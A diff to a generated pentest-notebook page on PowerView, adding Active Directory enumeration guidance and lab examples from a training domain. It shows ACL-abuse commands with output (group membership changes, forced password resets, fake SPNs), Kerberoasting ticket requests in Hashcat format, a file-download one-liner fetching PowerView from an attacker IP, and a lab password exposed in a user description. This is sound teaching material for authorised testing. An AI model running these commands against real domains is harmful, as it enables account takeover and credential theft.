@@ -9,6 +9,106 @@ hideFooterPagination: true
 
 {/* Generated from Commands/powerview.md. Edit the Markdown source, then run scripts/sync_site.py. */}
 
+## Ask one directory question at a time
+
+PowerView provides functions for directory objects, group relationships, ACLs and host information. Load the intended module, confirm the available functions, and use an exact identity or distinguished name when a broad query finds something interesting. Different PowerView variants expose different names/options.
+
+### Load and establish the domain context
+
+```powershell
+Import-Module .\PowerView.ps1
+Get-Command Get-Domain*
+Get-Domain
+Get-DomainController
+Get-DomainTrust
+```
+
+The script path must refer to the reviewed copy already available in the lab. Module loading does not grant directory or host permissions. Keep the current identity and the queried domain/DC with the result.
+
+### Query users, computers and memberships
+
+```powershell
+Get-DomainUser -Identity USERNAME
+Get-DomainUser -SPN
+Get-DomainComputer
+Get-DomainGroup -Identity GROUP_NAME
+Get-DomainGroupMember -Identity GROUP_NAME -Recurse
+```
+
+Read descriptions, SPNs, distinguished names and membership relationships as separate facts. A computer object may be stale or offline. An SPN-bearing account needs the separate Kerberoasting/delegation prerequisite analysis before choosing either branch.
+
+### Resolve an object permission
+
+```powershell
+Get-DomainObjectAcl -Identity TARGET_OBJECT -ResolveGUIDs
+```
+
+Resolve the trustee SID and account/group membership. Check whether the right applies to the intended object/attribute and whether it is inherited or constrained. GenericWrite, WriteDACL, WriteOwner and a particular extended right do not mean the same thing.
+
+### Connect host findings to your access
+
+```powershell
+Get-DomainComputer -Identity TARGET_HOST
+Get-DomainUser -Identity USERNAME -Properties samaccountname,memberof,serviceprincipalname,description
+```
+
+Select the attributes you need and inspect them directly. For host-local sessions or administrator checks, first establish connectivity and the permission needed by that query. Directory-read access is not automatically remote administrative access.
+
+### Choose the next branch from evidence
+
+If a group has a useful right, map the nested membership path and resource. If an ACL grants object control, use the ACL guide to identify the exact permissible change. If a service account has an SPN, record its account purpose and relevant privileges. If a trust exists, inspect its direction and resource permissions.
+
+When a function is missing, check the loaded module/variant. When output is empty, distinguish no matching object, wrong domain/identity, omitted property and denied access. Preserve the query and errors so an incomplete collection is not mistaken for an absence of attack paths.
+
+## PowerView: choose the operation and read the result
+
+Import PowerView, then query users, computers and groups.
+
+### What the result establishes
+
+Read object identities, distinguished names, memberships and resolved ACL rights as separate relationships.
+
+### Prerequisites and common failures
+
+PowerView functions require the intended module to be loaded; command names vary between versions, and a listed ACE must be evaluated for effective access.
+
+### Example 1: Commands
+
+Run in: **Windows PowerShell**.
+
+```powershell
+Import-Module .\PowerView.ps1
+Get-DomainUser -Identity USER
+Get-DomainComputer
+Get-DomainGroupMember -Identity "Domain Admins"
+```
+
+### Example 2: PowerView — Load and Enumerate
+
+Run in: **Saved lab example**.
+
+```powershell
+Import-Module .\PowerView.ps1
+Get-Command Get-DomainUser
+Get-DomainUser -Identity YOUR_USERNAME
+```
+
+Saved context: [PowerView — Load and Enumerate — PowerView — Load and Enumerate](/tools/powerview). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
+
+### Example 3: JavaScript (Windows — cscript.exe)
+
+Run in: **Saved lab example**.
+
+```cmd
+cscript.exe /nologo wget.js http://<IP>/PowerView.ps1 PowerView.ps1
+```
+
+Saved context: [File Transfers for Linux and Windows — JavaScript (Windows — cscript.exe)](/post-exploitation/file-transfers-cheat-sheet#javascript-windows-—-cscript-exe). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
+
+## Saved commands and notebook recipes
+
+Import PowerView, then query users, computers and groups.
+
 Replace UPPER_CASE values with your lab values.
 
 [Search this tool’s saved examples](/commands/notebook?tool=powerview) · [All tools](/index)
@@ -23,6 +123,13 @@ Get-DomainUser -Identity USER
 Get-DomainComputer
 Get-DomainGroupMember -Identity "Domain Admins"
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [PowerView — Load and Enumerate — Example 1: Commands](/tools/powerview#example-1-commands)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 [Find another command](/index) · [Ports](/enumeration/ports-cheatsheet)
 
@@ -45,6 +152,13 @@ VERBOSE: [Get-PrincipalContext] Using alternate credentials
 VERBOSE: [Add-DomainGroupMember] Adding member 'damundsen' to group 'Help Desk Level 1'
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [ACL Abuse Tactics — Adding damundsen to the Help Desk Level 1 Group](/active-directory/acl-abuse-lab#adding-damundsen-to-the-help-desk-level-1-group)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="Changing the User&#x27;s Password">
@@ -62,6 +176,13 @@ VERBOSE: [Get-PrincipalContext] Using alternate credentials
 VERBOSE: [Set-DomainUserPassword] Attempting to set the password for user 'damundsen'
 VERBOSE: [Set-DomainUserPassword] Password for user 'damundsen' successfully reset
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [ACL Abuse Tactics — Changing the User's Password](/active-directory/acl-abuse-lab#changing-the-users-password)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -85,6 +206,13 @@ damundsen
 dpayne
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [ACL Abuse Tactics — Confirming damundsen was Added to the Group](/active-directory/acl-abuse-lab#confirming-damundsen-was-added-to-the-group)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="Confirming damundsen was Removed from the Group">
@@ -96,6 +224,13 @@ dpayne
 ```powershell
 PS C:\htb> Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName |? {$_.MemberName -eq 'damundsen'} -Verbose
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [ACL Abuse Tactics — Confirming damundsen was Removed from the Group](/active-directory/acl-abuse-lab#confirming-damundsen-was-removed-from-the-group)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -117,6 +252,13 @@ VERBOSE: [Get-DomainObject] Get-DomainObject filter string:
 VERBOSE: [Set-DomainObject] Setting 'serviceprincipalname' to 'notahacker/LEGIT' for object 'adunn'
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [ACL Abuse Tactics — Creating a Fake SPN](/active-directory/acl-abuse-lab#creating-a-fake-spn)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="Removing damundsen from the Help Desk Level 1 Group">
@@ -132,6 +274,13 @@ VERBOSE: [Get-PrincipalContext] Using alternate credentials
 VERBOSE: [Remove-DomainGroupMember] Removing member 'damundsen' from group 'Help Desk Level 1'
 True
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [ACL Abuse Tactics — Removing damundsen from the Help Desk Level 1 Group](/active-directory/acl-abuse-lab#removing-damundsen-from-the-help-desk-level-1-group)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -152,6 +301,13 @@ VERBOSE: [Get-DomainObject] Get-DomainObject filter string:
 (&(|(|(samAccountName=adunn)(name=adunn)(displayname=adunn))))
 VERBOSE: [Set-DomainObject] Clearing 'serviceprincipalname' for object 'adunn'
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [ACL Abuse Tactics — Removing the Fake SPN from adunn's Account](/active-directory/acl-abuse-lab#removing-the-fake-spn-from-adunns-account)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -182,6 +338,13 @@ AceFlags              : ContainerInherit
 AceQualifier          : AccessAllowed
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [ACL Enumeration — Further Enumeration of Rights Using damundsen](/active-directory/acl-enumeration#further-enumeration-of-rights-using-damundsen)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="Investigating the Help Desk Level 1 Group with Get-DomainGroup">
@@ -197,6 +360,13 @@ memberof
 --------
 CN=Information Technology,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [ACL Enumeration — Investigating the Help Desk Level 1 Group with Get-DomainGroup](/active-directory/acl-enumeration#investigating-the-help-desk-level-1-group-with-get-domaingroup)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -226,6 +396,13 @@ AuditFlags            : None
 AceFlags              : ContainerInherit
 AceQualifier          : AccessAllowed
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [ACL Enumeration — Investigating the Information Technology Group](/active-directory/acl-enumeration#investigating-the-information-technology-group)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -280,6 +457,13 @@ OpaqueLength           : 0
 <SNIP>
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [ACL Enumeration — Looking for Interesting Access](/active-directory/acl-enumeration#looking-for-interesting-access)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="Using Find-InterestingDomainAcl">
@@ -292,6 +476,13 @@ OpaqueLength           : 0
 PS C:\htb> Import-Module .\PowerView.ps1
 PS C:\htb> $sid = Convert-NameToSid wley
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [PowerView — Load and Enumerate — Example 7: Using Find-InterestingDomainAcl](/tools/powerview#example-7-using-find-interestingdomainacl) · [ACL Enumeration — Using Find-InterestingDomainAcl](/active-directory/acl-enumeration#using-find-interestingdomainacl)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -324,6 +515,13 @@ PropagationFlags       : None
 AuditFlags             : None
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [ACL Enumeration — Using Get-DomainObjectACL](/active-directory/acl-enumeration#using-get-domainobjectacl)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="Using the -ResolveGUIDs Flag">
@@ -355,6 +553,13 @@ InheritedObjectAceType : All
 OpaqueLength           : 0
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [ACL Enumeration — Using the -ResolveGUIDs Flag](/active-directory/acl-enumeration#using-the-resolveguids-flag)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="AD ACL Abuse: Quick Reference">
@@ -373,6 +578,13 @@ Add-DomainGroupMember -Identity 'Helpdesk' -Members me
 Set-DomainObject -Identity victim -Set @{serviceprincipalname='fake/svc'}
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [AD ACL Abuse: Quick Reference — Existing notes and worked examples](/active-directory/acl-abuse#existing-notes-and-worked-examples)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="Add Members">
@@ -385,6 +597,13 @@ Set-DomainObject -Identity victim -Set @{serviceprincipalname='fake/svc'}
 Add-DomainGroupMember
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Active Directory ACL Abuse Primer — Add Members](/active-directory/acl-primer#add-members) · [Active Directory ACL Abuse Primer — AddSelf](/active-directory/acl-primer#addself)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="ForceChangePassword">
@@ -396,6 +615,13 @@ Add-DomainGroupMember
 ```powershell
 Set-DomainUserPassword
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Active Directory ACL Abuse Primer — ForceChangePassword](/active-directory/acl-primer#forcechangepassword)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -410,6 +636,13 @@ Set-DomainUserPassword
 Add-DomainGroupMember
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Active Directory ACL Abuse Primer — GenericAll](/active-directory/acl-primer#genericall) · [Active Directory ACL Abuse Primer — AllExtendedRights](/active-directory/acl-primer#allextendedrights)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="GenericWrite">
@@ -421,6 +654,13 @@ Add-DomainGroupMember
 ```powershell
 Set-DomainObject
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Active Directory ACL Abuse Primer — GenericWrite](/active-directory/acl-primer#genericwrite)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -447,6 +687,13 @@ PowerView           Enumerate and test AD permissions
 Main outcomes       Lateral movement, privilege escalation, persistence
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Active Directory ACL Abuse Primer — Quick Recall](/active-directory/acl-primer#quick-recall)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="WriteDACL">
@@ -459,6 +706,13 @@ Main outcomes       Lateral movement, privilege escalation, persistence
 Add-DomainObjectACL
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Active Directory ACL Abuse Primer — WriteDACL](/active-directory/acl-primer#writedacl)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="WriteOwner">
@@ -470,6 +724,13 @@ Add-DomainObjectACL
 ```powershell
 Set-DomainObjectOwner
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Active Directory ACL Abuse Primer — WriteOwner](/active-directory/acl-primer#writeowner)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -505,6 +766,13 @@ Get-DomainSPNTicket
     # Identify/request Kerberos tickets associated with SPNs
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Active Directory Enumeration Commands — Powerview](/active-directory/command-reference#powerview)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="Active Directory Enumeration: Quick Reference">
@@ -521,6 +789,13 @@ Get-DomainGroupMember "Domain Admins"
 Find-LocalAdminAccess       # where does my user have local admin?
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Active Directory Enumeration: Quick Reference — Existing notes and worked examples](/active-directory/enumeration#existing-notes-and-worked-examples)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="Active Directory Trusts: Quick Reference">
@@ -533,6 +808,13 @@ Find-LocalAdminAccess       # where does my user have local admin?
 Get-DomainTrust
 Get-DomainTrustMapping           # map the whole forest
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Active Directory Trusts: Quick Reference — Existing notes and worked examples](/active-directory/domain-trusts#existing-notes-and-worked-examples)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -550,6 +832,13 @@ distinguishedname                                       objectsid
 CN=Enterprise Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL S-1-5-21-3842939050-3880317879-2865463114-519
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Child to Parent Trusts - Windows — Obtaining Enterprise Admins Group's SID using Get-DomainGroup](/active-directory/trusts-child-parent-windows#obtaining-enterprise-admins-groups-sid-using-get-domaingroup)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="Using Get-DomainSID">
@@ -563,6 +852,13 @@ PS C:\htb> Get-DomainSID
 
 S-1-5-21-2806153819-209893948-922872689
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Child to Parent Trusts - Windows — Using Get-DomainSID](/active-directory/trusts-child-parent-windows#using-get-domainsid)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -581,6 +877,13 @@ krbtgt
 mssqlsvc
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Cross-Forest Trusts - Windows — Enumerating Accounts for Associated SPNs Using Get-DomainUser](/active-directory/trusts-cross-forest-windows#enumerating-accounts-for-associated-spns-using-get-domainuser)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="Enumerating the mssqlsvc Account">
@@ -596,6 +899,13 @@ samaccountname memberof
 -------------- --------
 mssqlsvc       CN=Domain Admins,CN=Users,DC=FREIGHTLOGISTICS,DC=LOCAL
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Cross-Forest Trusts - Windows — Enumerating the mssqlsvc Account](/active-directory/trusts-cross-forest-windows#enumerating-the-mssqlsvc-account)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -621,6 +931,13 @@ PS C:\htb> Convert-SidToName S-1-5-21-3842939050-3880317879-2865463114-500
 INLANEFREIGHT\administrator
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Cross-Forest Trusts - Windows — Using Get-DomainForeignGroupMember](/active-directory/trusts-cross-forest-windows#using-get-domainforeigngroupmember)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="Checking for Reversible Encryption Option using Get-DomainUser">
@@ -636,6 +953,13 @@ samaccountname                         useraccountcontrol
 --------------                         ------------------
 proxyagent     ENCRYPTED_TEXT_PWD_ALLOWED, NORMAL_ACCOUNT
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [DCSync Lab — Checking for Reversible Encryption Option using Get-DomainUser](/active-directory/dcsync-lab#checking-for-reversible-encryption-option-using-get-domainuser)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -657,6 +981,13 @@ memberof           : {CN=VPN Users,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,D
                      Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL...}
 useraccountcontrol : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [DCSync Lab — Using Get-DomainUser to View adunn's Group Membership](/active-directory/dcsync-lab#using-get-domainuser-to-view-adunns-group-membership)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -701,6 +1032,13 @@ SecurityIdentifier    : S-1-5-21-3842939050-3880317879-2865463114-1164
 ObjectAceType         : DS-Replication-Get-Changes-All
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [DCSync Lab — Using Get-ObjectAcl to Check adunn's Replication Rights](/active-directory/dcsync-lab#using-get-objectacl-to-check-adunns-replication-rights)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="Checking Users in the Child Domain using Get-DomainUser">
@@ -720,6 +1058,13 @@ Guest
 lab_adm
 krbtgt
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Domain Trusts Primer — Checking Users in the Child Domain using Get-DomainUser](/active-directory/trusts-primer#checking-users-in-the-child-domain-using-get-domainuser)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -748,6 +1093,13 @@ TrustDirection  : Bidirectional
 WhenCreated     : 11/1/2021 8:07:09 PM
 WhenChanged     : 2/27/2022 12:02:39 AM
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Domain Trusts Primer — Checking for Existing Trusts using Get-DomainTrust](/active-directory/trusts-primer#checking-for-existing-trusts-using-get-domaintrust)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -793,6 +1145,13 @@ WhenCreated     : 11/1/2021 6:20:22 PM
 WhenChanged     : 2/26/2022 11:55:55 PM
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Domain Trusts Primer — Using Get-DomainTrustMapping](/active-directory/trusts-primer#using-get-domaintrustmapping)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="Encryption Types">
@@ -804,6 +1163,13 @@ WhenChanged     : 2/26/2022 11:55:55 PM
 ```powershell
 Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Kerberoasting from Windows — Encryption Types](/active-directory/kerberoasting-windows#encryption-types)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -817,6 +1183,13 @@ Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supp
 Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Kerberoasting from Windows — Export All Results to CSV](/active-directory/kerberoasting-windows#export-all-results-to-csv)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="Import PowerView and Enumerate SPN Users">
@@ -829,6 +1202,13 @@ Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfre
 Import-Module .\PowerView.ps1
 Get-DomainUser * -spn | select samaccountname
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Kerberoasting from Windows — Import PowerView and Enumerate SPN Users](/active-directory/kerberoasting-windows#import-powerview-and-enumerate-spn-users) · [PowerView — Load and Enumerate — Example 6: Import PowerView and Enumerate SPN Users](/tools/powerview#example-6-import-powerview-and-enumerate-spn-users)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -853,6 +1233,13 @@ Get-DomainUser -Identity <USER> | Get-DomainSPNTicket -Format Hashcat
 .\Rubeus.exe kerberoast /user:<USER> /nowrap
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Kerberoasting from Windows — Quick Reference](/active-directory/kerberoasting-windows#quick-reference)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="Request a Ticket for One User">
@@ -864,6 +1251,13 @@ Get-DomainUser -Identity <USER> | Get-DomainSPNTicket -Format Hashcat
 ```powershell
 Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Kerberoasting from Windows — Request a Ticket for One User](/active-directory/kerberoasting-windows#request-a-ticket-for-one-user) · [PowerView — Load and Enumerate — Example 5: Request a Ticket for One User](/tools/powerview#example-5-request-a-ticket-for-one-user)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -887,6 +1281,13 @@ At C:\Users\backupadm\Documents\PowerView.ps1:5253 char:20
     + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
     + FullyQualifiedErrorId : DirectoryServicesCOMException
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Kerberos Double Hop — Workaround #1: PSCredential Object](/active-directory/kerberos-double-hop#workaround-#1-pscredential-object)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 **Kerberos Double Hop**
 
@@ -913,6 +1314,13 @@ sapvc
 vmwarescvc
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Kerberos Double Hop — Workaround #1: PSCredential Object](/active-directory/kerberos-double-hop#workaround-#1-pscredential-object)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 **Kerberos Double Hop**
 
 ```shellsession
@@ -930,6 +1338,13 @@ At C:\Users\backupadm\Documents\PowerView.ps1:5253 char:20
     + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
     + FullyQualifiedErrorId : DirectoryServicesCOMException
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Kerberos Double Hop — Workaround #1: PSCredential Object](/active-directory/kerberos-double-hop#workaround-#1-pscredential-object)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -951,6 +1366,13 @@ At C:\Users\backupadm\Documents\PowerView.ps1:5253 char:20
    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
    + FullyQualifiedErrorId : DirectoryServicesCOMException
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Kerberos Double Hop — Workaround #2: Register PSSession Configuration](/active-directory/kerberos-double-hop#workaround-#2-register-pssession-configuration)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 **Kerberos Double Hop**
 
@@ -974,6 +1396,13 @@ sapvc
 vmwarescvc
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Kerberos Double Hop — Workaround #2: Register PSSession Configuration](/active-directory/kerberos-double-hop#workaround-#2-register-pssession-configuration)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="Checking for PASSWD_NOTREQD Setting using Get-DomainUser">
@@ -993,6 +1422,13 @@ ehamilton                            PASSWD_NOTREQD, NORMAL_ACCOUNT, DONT_EXPIRE
 $725000-9jb50uejje9f                       ACCOUNTDISABLE, PASSWD_NOTREQD, NORMAL_ACCOUNT
 nagiosagent                                                PASSWD_NOTREQD, NORMAL_ACCOUNT
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Miscellaneous Misconfigurations — Checking for PASSWD_NOTREQD Setting using Get-DomainUser](/active-directory/miscellaneous-misconfigurations#checking-for-passwd_notreqd-setting-using-get-domainuser)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -1024,6 +1460,13 @@ PropagationFlags      : None
 AuditFlags            : None
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Miscellaneous Misconfigurations — Enumerating Domain User GPO Rights](/active-directory/miscellaneous-misconfigurations#enumerating-domain-user-gpo-rights)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="Enumerating GPO Names with PowerView">
@@ -1054,6 +1497,13 @@ GuardAutoLogon
 Certificate Services
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Miscellaneous Misconfigurations — Enumerating GPO Names with PowerView](/active-directory/miscellaneous-misconfigurations#enumerating-gpo-names-with-powerview)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="Enumerating for DONT_REQ_PREAUTH Value using Get-DomainUser">
@@ -1069,6 +1519,13 @@ samaccountname     : mmorgan
 userprincipalname  : mmorgan@inlanefreight.local
 useraccountcontrol : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD, DONT_REQ_PREAUTH
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Miscellaneous Misconfigurations — Enumerating for DONT_REQ_PREAUTH Value using Get-DomainUser](/active-directory/miscellaneous-misconfigurations#enumerating-for-dont_req_preauth-value-using-get-domainuser)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -1089,6 +1546,13 @@ krbtgt         Key Distribution Center Service Account
 ldap.agent     *** DO NOT CHANGE ***  3/12/2012: Sunsh1ne4All!
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Miscellaneous Misconfigurations — Finding Passwords in the Description Field using Get-Domain User](/active-directory/miscellaneous-misconfigurations#finding-passwords-in-the-description-field-using-get-domain-user)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="PowerView — Load and Enumerate">
@@ -1103,6 +1567,13 @@ Get-Command Get-DomainUser
 Get-DomainUser -Identity YOUR_USERNAME
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [PowerView — Load and Enumerate — Example 2: PowerView — Load and Enumerate](/tools/powerview#example-2-powerview-—-load-and-enumerate) · [PowerView — Load and Enumerate — Existing notes and worked examples](/tools/powerview#existing-notes-and-worked-examples)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 **PowerView — Load and Enumerate**
 
 Context from the notebook: Replace  YOUR_USERNAME . Successful import makes the PowerView commands available in  this PowerShell session ; the final command returns the matching directory object. Loading PowerView is different from  Import-Module ActiveDirectory , which loads Microsoft's separate module.
@@ -1110,6 +1581,13 @@ Context from the notebook: Replace  YOUR_USERNAME . Successful import makes the 
 ```text
 Import-Module ActiveDirectory
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Active Directory Enumeration from Windows — ActiveDirectory PowerShell Module](/active-directory/enumeration-windows#activedirectory-powershell-module) · [PowerView — Load and Enumerate — Existing notes and worked examples](/tools/powerview#existing-notes-and-worked-examples)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -1123,6 +1601,13 @@ Import-Module ActiveDirectory
 net share
 powershell Find-DomainShare -ComputerDomain domain.local
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Windows Privilege Escalation: Full Checklist — Network Enumeration](/privesc/windows-privesc-checklist#network-enumeration)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -1138,6 +1623,13 @@ Context from the notebook: With Credentials:  On a domain-joined machine, the bu
 Get-DomainPolicy
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
